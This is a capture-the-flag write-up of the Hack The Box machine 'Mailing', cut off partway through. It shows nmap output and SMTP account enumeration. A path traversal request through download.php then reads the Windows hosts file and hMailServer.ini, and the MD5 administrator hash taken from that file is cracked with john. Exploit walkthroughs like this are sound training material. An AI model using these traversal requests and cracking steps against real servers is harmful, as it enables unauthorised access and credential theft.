# Mailing-HTB
```bash
└─$ cat nmap_report.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 16:25 -0300
Nmap scan report for 10.129.232.39
Host is up (0.42s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: CAPABILITY RIGHTS=texkA0001 NAMESPACE IDLE completed IMAP4 CHILDREN ACL OK IMAP4rev1 QUOTA SORT
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: CAPABILITY RIGHTS=texkA0001 NAMESPACE IDLE completed IMAP4 CHILDREN ACL OK IMAP4rev1 QUOTA SORT
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
61127/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (95%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 22H2 (95%), Microsoft Windows Server 2019 (91%), Microsoft Windows 10 1803 (86%), Microsoft Windows 10 22H2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-22T19:28:12
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -2s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   347.03 ms 10.10.16.1
2   516.17 ms 10.129.232.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 242.89 seconds
```

We know that they are using hMailServer. Let's try to enumerate the mail service with telnet:
```bash
└─$ telnet 10.129.232.39 25
Trying 10.129.232.39...
Connected to 10.129.232.39.
Escape character is '^]'.
220 mailing.htb ESMTP
EHLO attacker
250-mailing.htb
250-SIZE 20480000
250-AUTH LOGIN PLAIN
250 HELP
MAIL FROM:<test@attacker.htb>
250 OK
RCPT TO:<administrator@mailing.htb>
250 OK
RCPT TO:<user@mailing.htb>
550 Account is not active.
RCPT TO:<info@mailing.htb>
250 OK
```
And also nmap:
```bash
└─$ nmap -p25 --script smtp-open-relay 10.129.232.39
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 07:55 -0300
Nmap scan report for mailing.htb (10.129.232.39)
Host is up (0.18s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server isn't an open relay, authentication needed

Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds
```

We need authentication, but superficial user enumeration is possible, it even shows us that administrator and info are valid accounts. For now let's what awaits behind port 80:
<img width="698" height="758" alt="image" src="https://github.com/user-attachments/assets/2e03e842-5dfe-4c41-a307-5f5a07f70234" />

There is a download link, let's check where it leads with burp:
<img width="631" height="502" alt="image" src="https://github.com/user-attachments/assets/8605c085-e358-4aa5-9c84-fe4287fdd8f8" />

"GET /download.php?file=instructions.pdf HTTP/1.1" let's test this for path traversal. But before that, google around the web for hMailServer's file structure. The official documentation has plenty of info https://www.hmailserver.com/documentation/latest/?page=reference_inifilesettings
<img width="1462" height="580" alt="image" src="https://github.com/user-attachments/assets/8c36c296-4439-4cee-9a17-b43b01cb5063" />
Since the hmailserver direcotry is structured like this C:\Program Files\hMailServer Let's try to escape from the hmailserver directory and GET the \etc\hosts file. We take two steps back "..\..\" to escape to C: and then follow the default path do the \etc\hosts file: "Windows\System32\drivers\etc\hosts"
```bash
GET /download.php?file=..\..\Windows\System32\drivers\etc\hosts HTTP/1.1
```
We can confirm that path traversal is possible:
<img width="1260" height="572" alt="image" src="https://github.com/user-attachments/assets/8b992f42-905c-49bf-acdd-8b1b2f3380c7" />

Now let's try to find where is the .ini or .conf or .cnf file is located inside hMailServer file structure. Their github page can give us some information on the matter:
<img width="1526" height="707" alt="image" src="https://github.com/user-attachments/assets/e88a10ee-39bd-482d-b4aa-cb1e2c278045" />

The .ini file is named hMailServer.ini  and it's located at the \bin directory
<img width="1525" height="252" alt="image" src="https://github.com/user-attachments/assets/689c5060-2f81-4260-913f-a9672ad5c06d" />

Now we can combine the info we alread know and the pathway should be: C:\Program Files\hMailServer\Bin\hmailserver.ini so let's try the request passing this as a parameter: GET /download.php?file=..\..\Program+Files\hmailServer\Bin\hMailServer.ini HTTP/1.1
<img width="1598" height="752" alt="image" src="https://github.com/user-attachments/assets/bd747d67-96c0-43ab-a9c1-738d5ae2aa65" />

Does not work, maybe hmailserver waws installed as 32 bit, try this: GET /download.php?file=..\..\Program+Files+(x86)\hmailServer\Bin\hMailServer.ini HTTP/1.1
This works plenty: <img width="1597" height="755" alt="image" src="https://github.com/user-attachments/assets/5e766160-b8a7-4df8-8847-914df55bb6ff" />

```bash
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
````
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 this is encrypted as MD5 
<img width="872" height="57" alt="image" src="https://github.com/user-attachments/assets/1a0042b9-be95-422d-a102-d3006b1a9dd6" />

Pass this to a hash.txt file:
```bash
└─$ echo '841bb5acfa6779ae432fd7a4e6600ba7' > hash.txt                      
```
Then pass it on to john:
```bash
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
homenetworkingadministrator (?)     
1g 0:00:00:00 DONE (2026-08-24 10:28) 3.225g/s 24393Kp/s 24393Kc/s 24393KC/s homerandme..homejame
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
The Administrator password is: homenetworkingadministrator

The Windows server is running a mail server, as we saw from the instructions.pdf file it is using the default Windows Mail client to connect to the mail server
<img width="752" height="191" alt="image" src="https://github.com/user-attachments/assets/81673b6d-4918-4b0d-b5f1-ce570e393af2" />





